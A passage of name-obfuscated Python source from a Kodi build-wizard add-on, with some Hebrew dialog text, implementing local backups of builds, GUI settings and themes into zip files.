    if not middle =='':#line:2472
        middle ='[ %s ]'%middle #line:2473
        OO0O0O0OOO0OOOO0O =int ((40 -len (middle ))/2 )#line:2474
        OO0OOO0000OO0OO0O ="%s%s%s"%(OO0OOO0000OO0OO0O [:OO0O0O0OOO0OOOO0O ],middle ,OO0OOO0000OO0OO0O [:OO0O0O0OOO0OOOO0O +2 ])#line:2475
    return OO0OOO0000OO0OO0O [:40 ]#line:2476
def convertAdvanced ():#line:2478
    if os .path .exists (ADVANCED ):#line:2479
        OO0O000O00O0O0O00 =open (ADVANCED )#line:2480
        OO00O00OOOO00000O =OO0O000O00O0O0O00 .read ()#line:2481
        if KODIV >=17 :#line:2482
            return #line:2483
        else :#line:2484
            return #line:2485
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2486
def backUpOptions (O000000OO0OO000O0 ,name =""):#line:2491
    OO0O0O0O0O000O000 =[ADDON_ID ,'cache','system','Thumbnails','peripheral_data','temp','My_Builds','library','keymaps']#line:2492
    OOO00O00O00O0OOOO =['Textures13.db','.DS_Store','advancedsettings.xml','Thumbs.db','.gitignore']#line:2493
    OO000O00OO0OO0OO0 =[os .path .join (DATABASE ,'onechannelcache.db'),os .path .join (DATABASE ,'saltscache.db'),os .path .join (DATABASE ,'saltscache.db-shm'),os .path .join (DATABASE ,'saltscache.db-wal'),os .path .join (DATABASE ,'saltshd.lite.db'),os .path .join (DATABASE ,'saltshd.lite.db-shm'),os .path .join (DATABASE ,'saltshd.lite.db-wal'),os .path .join (ADDOND ,'script.trakt','queue.db'),os .path .join (HOME ,'cache','commoncache.db'),os .path .join (ADDOND ,'script.module.dudehere.routines','access.log'),os .path .join (ADDOND ,'script.module.dudehere.routines','trakt.db'),os .path .join (ADDOND ,'script.module.metahandler','meta_cache','video_cache.db')]#line:2505
    OO00O00OO0OOO0O0O =translatepath (BACKUPLOCATION )#line:2507
    OOO000000O0OO000O =translatepath (MYBUILDS )#line:2508
    try :#line:2509
        if not os .path .exists (OO00O00OO0OOO0O0O ):xbmcvfs .mkdirs (OO00O00OO0OOO0O0O )#line:2510
        if not os .path .exists (OOO000000O0OO000O ):xbmcvfs .mkdirs (OOO000000O0OO000O )#line:2511
    except Exception as O000O00000OO0O000 :#line:2512
        DIALOG .ok (ADDONTITLE ,"[COLOR %s]Error making Back Up directories:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,str (O000O00000OO0O000 )))#line:2513
        return #line:2514
    if O000000OO0OO000O0 =="build":#line:2515
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם ברצונך לגבות את הבילד?[/COLOR]"%COLOR2 ,nolabel ="[B][COLOR red]ביטול[/COLOR][/B]",yeslabel ="[B][COLOR green]גיבוי[/COLOR][/B]"):#line:2516
            if name =="":#line:2517
                name =getKeyboard ("","אנא הכנס שם ל %s באנגלית"%O000000OO0OO000O0 )#line:2518
                if not name :return False #line:2519
                name =name .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:2520
            name =urllib .quote_plus (name );OOO000000OO00OO00 =''#line:2521
            OO0OO0OOOOOOOOOOO =os .path .join (OOO000000O0OO000O ,'%s.zip'%name )#line:2522
            O0OOO0000OO000000 =0 #line:2523
            OO0O0OO0O000OOOO0 =[]#line:2524
            if not DIALOG .yesno (ADDONTITLE ,"האם לשמור את תיקית האדון דאטה?",yeslabel ='[B][COLOR green]שמור[/COLOR][/B]',nolabel ='[B][COLOR red]לא לשמור[/COLOR][/B]'):#line:2525
                OO0O0O0O0O000O000 .append ('addon_data')#line:2526
            convertSpecial (HOME ,True )#line:2527
            asciiCheck (HOME ,True )#line:2528
            try :#line:2529
                OOOO0OO0O0O000OOO =zipfile .ZipFile (translatepath (OO0OO0OOOOOOOOOOO ),mode ='w')#line:2530
            except :#line:2531
                try :#line:2532
                    OOO000000OO00OO00 =os .path .join (PACKAGES ,'%s.zip'%name )#line:2533
                    OOOO0OO0O0O000OOO =zipfile .ZipFile (OOO000000OO00OO00 ,mode ='w')#line:2534
                except :#line:2535
                    log ("Unable to create %s.zip"%name ,5 )#line:2536
                    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]We are unable to write to the current backup directory, would you like to change the location?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Directory[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:2537
                        openS ()#line:2538
                        return #line:2539
                    else :#line:2540
                        return #line:2541
            DP .create ("[COLOR %s]%s[/COLOR][COLOR %s]: Creating Zip[/COLOR]"%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Creating back up zip"%COLOR2 ,"","Please Wait...[/COLOR]")#line:2542
            for O0OOOOOO0OO00O00O ,OO000OO00OO00OO00 ,O000OO0O000OO000O in os .walk (HOME ):#line:2543
                OO000OO00OO00OO00 [:]=[O00OO0O00OOOOOO0O for O00OO0O00OOOOOO0O in OO000OO00OO00OO00 if O00OO0O00OOOOOO0O not in OO0O0O0O0O000O000 ]#line:2544
                O000OO0O000OO000O [:]=[OO0O0000000O00OOO for OO0O0000000O00OOO in O000OO0O000OO000O if OO0O0000000O00OOO not in OOO00O00O00O0OOOO ]#line:2545
                for OO00OOOO0O000OOO0 in O000OO0O000OO000O :#line:2546
                    OO0O0OO0O000OOOO0 .append (OO00OOOO0O000OOO0 )#line:2547
            O00OO00000O00OO00 =len (OO0O0OO0O000OOOO0 )#line:2548
            for O0OOOOOO0OO00O00O ,OO000OO00OO00OO00 ,O000OO0O000OO000O in os .walk (HOME ):#line:2549
                OO000OO00OO00OO00 [:]=[O0OO0O000OO00000O for O0OO0O000OO00000O in OO000OO00OO00OO00 if O0OO0O000OO00000O not in OO0O0O0O0O000O000 ]#line:2550
                O000OO0O000OO000O [:]=[OOO00O0OO00OOOOO0 for OOO00O0OO00OOOOO0 in O000OO0O000OO000O if OOO00O0OO00OOOOO0 not in OOO00O00O00O0OOOO ]#line:2551
                for OO00OOOO0O000OOO0 in O000OO0O000OO000O :#line:2552
                    try :#line:2553
                        O0OOO0000OO000000 +=1 #line:2554
                        OO0OO0OOOOOO00000 =percentage (O0OOO0000OO000000 ,O00OO00000O00OO00 )#line:2555
                        DP .update (int (OO0OO0OOOOOO00000 ),'[COLOR %s]Creating back up zip: [COLOR%s]%s[/COLOR] / [COLOR%s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO0000OO000000 ,COLOR1 ,O00OO00000O00OO00 ),'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00OOOO0O000OOO0 ),'')#line:2556
                        OO00O00OO0O0O00OO =os .path .join (O0OOOOOO0OO00O00O ,OO00OOOO0O000OOO0 )#line:2557
                        if OO00OOOO0O000OOO0 in LOGFILES :log ("[Back Up] Type = '%s': Ignore %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 );continue #line:2558
                        elif os .path .join (O0OOOOOO0OO00O00O ,OO00OOOO0O000OOO0 )in OO000O00OO0OO0OO0 :log ("[Back Up] Type = '%s': Ignore %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 );continue #line:2559
                        elif os .path .join ('addons','packages')in OO00O00OO0O0O00OO :log ("[Back Up] Type = '%s': Ignore %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 );continue #line:2560
                        elif OO00OOOO0O000OOO0 .endswith ('.csv'):log ("[Back Up] Type = '%s': Ignore %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 );continue #line:2561
                        elif OO00OOOO0O000OOO0 .endswith ('.pyo'):continue #line:2562
                        elif OO00OOOO0O000OOO0 .endswith ('.db')and 'Database'in O0OOOOOO0OO00O00O :#line:2563
                            OO0OO00000OO0OO00 =OO00OOOO0O000OOO0 .replace ('.db','')#line:2564
                            OO0OO00000OO0OO00 =''.join ([OOO00O00O00O00O0O for OOO00O00O00O00O0O in OO0OO00000OO0OO00 if not OOO00O00O00O00O0O .isdigit ()])#line:2565
                            if OO0OO00000OO0OO00 in ['Addons','ADSP','Epg','MyMusic','MyVideos','Textures','TV','ViewModes']:#line:2566
                                if not OO00OOOO0O000OOO0 ==latestDB (OO0OO00000OO0OO00 ):log ("[Back Up] Type = '%s': Ignore %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 );continue #line:2567
                        try :#line:2568
                            OOOO0OO0O0O000OOO .write (OO00O00OO0O0O00OO ,OO00O00OO0O0O00OO [len (HOME ):],zipfile .ZIP_DEFLATED )#line:2569
                        except :pass #line:2570
                    except :pass #line:2571
            OOOO0OO0O0O000OOO .close ()#line:2572
            xbmc .sleep (500 )#line:2573
            DP .update (100 ,"Creating %s_guisettings.zip"%name ,"","")#line:2574
            backUpOptions ('guifix',name )#line:2575
            if not OOO000000OO00OO00 =='':#line:2576
                O00OOOOOOO00O0OOO =xbmcvfs .rename (OOO000000OO00OO00 ,OO0OO0OOOOOOOOOOO )#line:2577
                if O00OOOOOOO00O0OOO ==0 :#line:2578
                    xbmcvfs .copy (OOO000000OO00OO00 ,OO0OO0OOOOOOOOOOO )#line:2579
                    xbmcvfs .delete (OOO000000OO00OO00 )#line:2580
            DP .close ()#line:2581
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]%s[/COLOR] [COLOR %s]backup successful:[/COLOR]"%(COLOR1 ,name ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0OOOOOOOOOOO ))#line:2582
    elif O000000OO0OO000O0 =="guifix":#line:2583
        if name =="":#line:2584
            OO0OO0OO00OOOO000 =getKeyboard ("","Please enter a name for the %s zip"%O000000OO0OO000O0 )#line:2585
            if not OO0OO0OO00OOOO000 :return False #line:2586
            convertSpecial (USERDATA ,True )#line:2587
            asciiCheck (USERDATA ,True )#line:2588
        else :OO0OO0OO00OOOO000 =name #line:2589
        OO0OO0OO00OOOO000 =urllib .quote_plus (OO0OO0OO00OOOO000 );O000OO0O00O0O0000 =''#line:2590
        OOOO0000OO0O0OO0O =translatepath (os .path .join (OOO000000O0OO000O ,'%s_guisettings.zip'%OO0OO0OO00OOOO000 ))#line:2591
        if os .path .exists (GUISETTINGS ):#line:2592
            try :#line:2593
                OOOO0OO0O0O000OOO =zipfile .ZipFile (OOOO0000OO0O0OO0O ,mode ='w')#line:2594
            except :#line:2595
                try :#line:2596
                    O000OO0O00O0O0000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0OO0OO00OOOO000 )#line:2597
                    OOOO0OO0O0O000OOO =zipfile .ZipFile (O000OO0O00O0O0000 ,mode ='w')#line:2598
                except :#line:2599
                    log ("Unable to create %s_guisettings.zip"%OO0OO0OO00OOOO000 ,5 )#line:2600
                    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]We are unable to write to the current backup directory, would you like to change the location?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Directory[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:2601
                        openS ()#line:2602
                        return #line:2603
                    else :#line:2604
                        return #line:2605
            try :#line:2606
                OOOO0OO0O0O000OOO .write (GUISETTINGS ,'guisettings.xml',zipfile .ZIP_DEFLATED )#line:2607
                OOOO0OO0O0O000OOO .write (PROFILES ,'profiles.xml',zipfile .ZIP_DEFLATED )#line:2608
                OO0O0000000000OO0 =glob .glob (os .path .join (ADDOND ,'skin.*',''))#line:2609
                log (str (OO0O0000000000OO0 ),5 )#line:2610
                for OOOOO000OOOOOO0OO in OO0O0000000000OO0 :#line:2611
                    OO0O00OO00O0OO000 =os .path .split (OOOOO000OOOOOO0OO [:-1 ])[1 ]#line:2612
                    if not OO0O00OO00O0OO000 in ['skin.confluence','skin.re-touch','skin.estuary','skin.myconfluence','skin.estouchy','skin.anonymous.mod','skin.anonymous.nox','skin.Premium.mod']:#line:2613
                        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to add the following skin folder to the GuiFix Zip File?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O00OO00O0OO000 ),yeslabel ="[B][COLOR green]Add Skin[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Skin[/COLOR][/B]"):#line:2614
                            for O0OOOOOO0OO00O00O ,OO000OO00OO00OO00 ,O000OO0O000OO000O in os .walk (os .path .join (ADDOND ,OOOOO000OOOOOO0OO )):#line:2615
                                O000OO0O000OO000O [:]=[OOOO0O00O0OO0O0O0 for OOOO0O00O0OO0O0O0 in O000OO0O000OO000O if OOOO0O00O0OO0O0O0 not in OOO00O00O00O0OOOO ]#line:2616
                                for OO00OOOO0O000OOO0 in O000OO0O000OO000O :#line:2617
                                    OO00O00OO0O0O00OO =os .path .join (O0OOOOOO0OO00O00O ,OO00OOOO0O000OOO0 )#line:2618
                                    OOOO0OO0O0O000OOO .write (OO00O00OO0O0O00OO ,OO00O00OO0O0O00OO [len (USERDATA ):],zipfile .ZIP_DEFLATED )#line:2619
                            OO0O0000000000OO0 =parseDOM (link ,'import',ret ='addon')#line:2620
                            if 'script.skinshortcuts'in OO0O0000000000OO0 :#line:2621
                                for O0OOOOOO0OO00O00O ,OO000OO00OO00OO00 ,O000OO0O000OO000O in os .walk (os .path .join (ADDOND ,'script.skinshortcuts')):#line:2622
                                    O000OO0O000OO000O [:]=[O0O000O00OOO00000 for O0O000O00OOO00000 in O000OO0O000OO000O if O0O000O00OOO00000 not in OOO00O00O00O0OOOO ]#line:2623
                                    for OO00OOOO0O000OOO0 in O000OO0O000OO000O :#line:2624
                                        OO00O00OO0O0O00OO =os .path .join (O0OOOOOO0OO00O00O ,OO00OOOO0O000OOO0 )#line:2625
                                        OOOO0OO0O0O000OOO .write (OO00O00OO0O0O00OO ,OO00O00OO0O0O00OO [len (USERDATA ):],zipfile .ZIP_DEFLATED )#line:2626
                        else :log ("[Back Up] Type = '%s': %s ignored"%(O000000OO0OO000O0 ,OOOOO000OOOOOO0OO ),5 )#line:2627
            except Exception as O000O00000OO0O000 :#line:2628
                log ("[Back Up] Type = '%s': %s"%(O000000OO0OO000O0 ,O000O00000OO0O000 ),5 )#line:2629
                pass #line:2630
            OOOO0OO0O0O000OOO .close ()#line:2631
            if not O000OO0O00O0O0000 =='':#line:2632
                O00OOOOOOO00O0OOO =xbmcvfs .rename (O000OO0O00O0O0000 ,OOOO0000OO0O0OO0O )#line:2633
                if O00OOOOOOO00O0OOO ==0 :#line:2634
                    xbmcvfs .copy (O000OO0O00O0O0000 ,OOOO0000OO0O0OO0O )#line:2635
                    xbmcvfs .delete (O000OO0O00O0O0000 )#line:2636
        else :log ("[Back Up] Type = '%s': guisettings.xml not found"%O000000OO0OO000O0 ,5 )#line:2637
        if name =="":#line:2638
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]GuiFix backup successful:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0000OO0O0OO0O ))#line:2639
    elif O000000OO0OO000O0 =="theme":#line:2640
        if not DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to create a theme backup?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Continue[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):LogNotify ("Theme Backup","Cancelled!");return False #line:2641
        if name =="":#line:2642
            OO00O00O000O00OOO =getKeyboard ("","Please enter a name for the %s zip"%O000000OO0OO000O0 )#line:2643
            if not OO00O00O000O00OOO :return False #line:2644
        else :OO00O00O000O00OOO =name #line:2645
        OO00O00O000O00OOO =urllib .quote_plus (OO00O00O000O00OOO );OOO000000OO00OO00 =''#line:2646
        OO0OO0OOOOOOOOOOO =os .path .join (OOO000000O0OO000O ,'%s.zip'%OO00O00O000O00OOO )#line:2647
        try :#line:2648
            OOOO0OO0O0O000OOO =zipfile .ZipFile (translatepath (OO0OO0OOOOOOOOOOO ),mode ='w')#line:2649
        except :#line:2650
            try :#line:2651
                OOO000000OO00OO00 =os .path .join (PACKAGES ,'%s.zip'%OO00O00O000O00OOO )#line:2652
                OOOO0OO0O0O000OOO =zipfile .ZipFile (OOO000000OO00OO00 ,mode ='w')#line:2653
            except :#line:2654
                log ("Unable to create %s.zip"%OO00O00O000O00OOO ,5 )#line:2655
                if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]We are unable to write to the current backup directory, would you like to change the location?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Directory[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:2656
                    openS ()#line:2657
                    return #line:2658
                else :#line:2659
                    return #line:2660
        convertSpecial (USERDATA ,True )#line:2661
        asciiCheck (USERDATA ,True )#line:2662
        try :#line:2663
            if not SKIN =='skin.confluence':#line:2664
                OO0O0O00OO0O0OO0O =os .path .join (ADDONS ,SKIN ,'media')#line:2665
                O00OO00O000O0OO00 =glob .glob (os .path .join (OO0O0O00OO0O0OO0O ,'*.xbt'))#line:2666
                if len (O00OO00O000O0OO00 )>1 :#line:2667
                    if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to go through the Texture Files for?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Textures[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Textures[/COLOR][/B]"):#line:2668
                        OO0O0O00OO0O0OO0O =os .path .join (ADDONS ,SKIN ,'media')#line:2669
                        O00OO00O000O0OO00 =glob .glob (os .path .join (OO0O0O00OO0O0OO0O ,'*.xbt'))#line:2670
                        for O0OO000OO00OO0O00 in O00OO00O000O0OO00 :#line:2671
                            if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to add the Texture File [COLOR %s]%s[/COLOR]?"%(COLOR1 ,COLOR2 ,O0OO000OO00OO0O00 .replace (OO0O0O00OO0O0OO0O ,"")[1 :]),"from [COLOR %s]%s[/COLOR][/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Textures[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Textures[/COLOR][/B]"):#line:2672
                                OO00O00OO0O0O00OO =O0OO000OO00OO0O00 #line:2673
                                O0OOO0OOOOO0O00O0 =OO00O00OO0O0O00OO .replace (HOME ,"")#line:2674
                                OOOO0OO0O0O000OOO .write (OO00O00OO0O0O00OO ,O0OOO0OOOOO0O00O0 ,zipfile .ZIP_DEFLATED )#line:2675
                else :#line:2676
                    for O0OO000OO00OO0O00 in O00OO00O000O0OO00 :#line:2677
                        if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to add the Texture File [COLOR %s]%s[/COLOR]?"%(COLOR2 ,COLOR1 ,O0OO000OO00OO0O00 .replace (OO0O0O00OO0O0OO0O ,"")[1 :]),"from [COLOR %s]%s[/COLOR][/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Textures[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Textures[/COLOR][/B]"):#line:2678
                            OO00O00OO0O0O00OO =O0OO000OO00OO0O00 #line:2679
                            O0OOO0OOOOO0O00O0 =OO00O00OO0O0O00OO .replace (HOME ,"")#line:2680
                            OOOO0OO0O0O000OOO .write (OO00O00OO0O0O00OO ,O0OOO0OOOOO0O00O0 ,zipfile .ZIP_DEFLATED )#line:2681
                O0O00O000O0OOOO0O =os .path .join (ADDOND ,SKIN ,'settings.xml')#line:2682
                if os .path .exists (O0O00O000O0OOOO0O ):#line:2683
                    if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to go add the [COLOR %s]settings.xml[/COLOR] in [COLOR %s]/addon_data/[/COLOR] for?"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Settings[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Settings[/COLOR][/B]"):#line:2684
                        OO0O0O00OO0O0OO0O =os .path .join (ADDOND ,SKIN )#line:2685
                        OOOO0OO0O0O000OOO .write (O0O00O000O0OOOO0O ,O0O00O000O0OOOO0O .replace (HOME ,""),zipfile .ZIP_DEFLATED )#line:2686
                OO0O00OO0OOO00O0O =open (os .path .join (ADDONS ,SKIN ,'addon.xml'));OOO00O0OOO000OOOO =OO0O00OO0OOO00O0O .read ();OO0O00OO0OOO00O0O .close ()#line:2687
                OO0O0000000000OO0 =parseDOM (OOO00O0OOO000OOOO ,'import',ret ='addon')#line:2688
                if 'script.skinshortcuts'in OO0O0000000000OO0 :#line:2689
                    if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to go add the [COLOR %s]settings.xml[/COLOR] for [COLOR %s]script.skinshortcuts[/COLOR]?"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Add Settings[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Settings[/COLOR][/B]"):#line:2690
                        for O0OOOOOO0OO00O00O ,OO000OO00OO00OO00 ,O000OO0O000OO000O in os .walk (os .path .join (ADDOND ,'script.skinshortcuts')):#line:2691
                            O000OO0O000OO000O [:]=[O0O0OO00O0OOO0OOO for O0O0OO00O0OOO0OOO in O000OO0O000OO000O if O0O0OO00O0OOO0OOO not in OOO00O00O00O0OOOO ]#line:2692
                            for OO00OOOO0O000OOO0 in O000OO0O000OO000O :#line:2693
                                OO00O00OO0O0O00OO =os .path .join (O0OOOOOO0OO00O00O ,OO00OOOO0O000OOO0 )#line:2694
                                OOOO0OO0O0O000OOO .write (OO00O00OO0O0O00OO ,OO00O00OO0O0O00OO [len (HOME ):],zipfile .ZIP_DEFLATED )#line:2695
            if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include a [COLOR %s]Backgrounds[/COLOR] folder?[/COLOR]"%(COLOR2 ,COLOR1 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:2696
                OO00O00OO0O0O00OO =DIALOG .browse (0 ,'Select location of backgrounds','files','',True ,False ,HOME ,False )#line:2697
                if not OO00O00OO0O0O00OO ==HOME :#line:2698
                    for O0OOOOOO0OO00O00O ,OO000OO00OO00OO00 ,O000OO0O000OO000O in os .walk (OO00O00OO0O0O00OO ):#line:2699
                        OO000OO00OO00OO00 [:]=[O00O0O0O000O00O00 for O00O0O0O000O00O00 in OO000OO00OO00OO00 if O00O0O0O000O00O00 not in OO0O0O0O0O000O000 ]#line:2700
                        O000OO0O000OO000O [:]=[OO0O0O0OOOO0OOOOO for OO0O0O0OOOO0OOOOO in O000OO0O000OO000O if OO0O0O0OOOO0OOOOO not in OOO00O00O00O0OOOO ]#line:2701
                        for OO00OOOO0O000OOO0 in O000OO0O000OO000O :#line:2702
                            try :#line:2703
                                O0OOO0OOOOO0O00O0 =os .path .join (O0OOOOOO0OO00O00O ,OO00OOOO0O000OOO0 )#line:2704
                                OOOO0OO0O0O000OOO .write (O0OOO0OOOOO0O00O0 ,O0OOO0OOOOO0O00O0 [len (HOME ):],zipfile .ZIP_DEFLATED )#line:2705
                            except Exception as O000O00000OO0O000 :#line:2706
                                log ("[Back Up] Type = '%s': Unable to backup %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 )#line:2707
                                log ("Backup Error: %s"%str (O000O00000OO0O000 ),5 )#line:2708
                O000OOOO0O0000O00 =latestDB ('Textures')#line:2709
                if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include the [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O000OOOO0O0000O00 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:2710
                    OOOO0OO0O0O000OOO .write (os .path .join (DATABASE ,O000OOOO0O0000O00 ),'/userdata/Database/%s'%O000OOOO0O0000O00 ,zipfile .ZIP_DEFLATED )#line:2711
            if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include any addons?[/COLOR]"%(COLOR2 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:2712
                OOOOO000OOOOOO0OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:2713
                O0000OOO00OOO000O =[];O000O0O00O000000O =[]#line:2714
                for O00OO0000O0O0OO00 in sorted (OOOOO000OOOOOO0OO ,key =lambda O000O0O0OOOOO00O0 :O000O0O0OOOOO00O0 ):#line:2715
                    O0OOOOOO0O0000O0O =os .path .split (O00OO0000O0O0OO00 [:-1 ])[1 ]#line:2716
                    if O0OOOOOO0O0000O0O in EXCLUDES :continue #line:2717
                    elif O0OOOOOO0O0000O0O in DEFAULTPLUGINS :continue #line:2718
                    elif O0OOOOOO0O0000O0O =='packages':continue #line:2719
                    O00000000000O00OO =os .path .join (O00OO0000O0O0OO00 ,'addon.xml')#line:2720
                    if os .path .exists (O00000000000O00OO ):#line:2721
                        OO0O00OO0OOO00O0O =open (O00000000000O00OO )#line:2722
                        O000000O00OOOO00O =OO0O00OO0OOO00O0O .read ()#line:2723
                        OO0O0000000000OO0 =parseDOM (O000000O00OOOO00O ,'addon',ret ='name')#line:2724
                        if len (OO0O0000000000OO0 )>0 :#line:2725
                            O0000OOO00OOO000O .append (OO0O0000000000OO0 [0 ])#line:2726
                            O000O0O00O000000O .append (O0OOOOOO0O0000O0O )#line:2727
                        else :#line:2728
                            O0000OOO00OOO000O .append (O0OOOOOO0O0000O0O )#line:2729
                            O000O0O00O000000O .append (O0OOOOOO0O0000O0O )#line:2730
                if KODIV >16 :#line:2731
                    O0O000O0O0O000000 =DIALOG .multiselect ("%s: Select the addons you wish to add to the zip."%ADDONTITLE ,O0000OOO00OOO000O )#line:2732
                else :#line:2733
                    O0O000O0O0O000000 =[];O0O00O0O0OOO0OO0O =0 #line:2734
                    O00O00000O00OO0OO =["-- Click here to Continue --"]+O0000OOO00OOO000O #line:2735
                    while not O0O00O0O0OOO0OO0O ==-1 :#line:2736
                        O0O00O0O0OOO0OO0O =DIALOG .select ("%s: Select the addons you wish to add to the zip."%ADDONTITLE ,O00O00000O00OO0OO )#line:2737
                        if O0O00O0O0OOO0OO0O ==-1 :break #line:2738
                        elif O0O00O0O0OOO0OO0O ==0 :break #line:2739
                        else :#line:2740
                            OOO0O00O00000O00O =(O0O00O0O0OOO0OO0O -1 )#line:2741
                            if OOO0O00O00000O00O in O0O000O0O0O000000 :#line:2742
                                O0O000O0O0O000000 .remove (OOO0O00O00000O00O )#line:2743
                                O00O00000O00OO0OO [O0O00O0O0OOO0OO0O ]=O0000OOO00OOO000O [OOO0O00O00000O00O ]#line:2744
                            else :#line:2745
                                O0O000O0O0O000000 .append (OOO0O00O00000O00O )#line:2746
                                O00O00000O00OO0OO [O0O00O0O0OOO0OO0O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0000OOO00OOO000O [OOO0O00O00000O00O ])#line:2747
                if len (O0O000O0O0O000000 )>0 :#line:2748
                    for O0O0O0OOOO0O00O0O in O0O000O0O0O000000 :#line:2749
                        for O0OOOOOO0OO00O00O ,OO000OO00OO00OO00 ,O000OO0O000OO000O in os .walk (os .path .join (ADDONS ,O000O0O00O000000O [O0O0O0OOOO0O00O0O ])):#line:2750
                            O000OO0O000OO000O [:]=[OO00O000O0O0OOO0O for OO00O000O0O0OOO0O in O000OO0O000OO000O if OO00O000O0O0OOO0O not in OOO00O00O00O0OOOO ]#line:2751
                            for OO00OOOO0O000OOO0 in O000OO0O000OO000O :#line:2752
                                if OO00OOOO0O000OOO0 .endswith ('.pyo'):continue #line:2753
                                OO00O00OO0O0O00OO =os .path .join (O0OOOOOO0OO00O00O ,OO00OOOO0O000OOO0 )#line:2754
                                OOOO0OO0O0O000OOO .write (OO00O00OO0O0O00OO ,OO00O00OO0O0O00OO [len (HOME ):],zipfile .ZIP_DEFLATED )#line:2755
            if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include the [COLOR %s]guisettings.xml[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:2756
